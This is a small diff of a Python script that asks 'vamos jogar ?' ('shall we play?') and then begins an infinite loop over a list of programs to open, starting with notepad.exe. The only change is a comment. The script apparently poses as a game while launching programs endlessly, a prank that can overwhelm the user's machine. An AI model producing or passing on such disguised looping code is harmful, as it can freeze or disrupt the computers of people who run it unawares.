@@ -1,7 +1,7 @@
 import subprocess
 
 input('vamos jogar ?')
-# Lista de programas para abrir
+# Lista de programas para abrir no Loop Infinito
 while True:
     programas = [
         "notepad.exe",
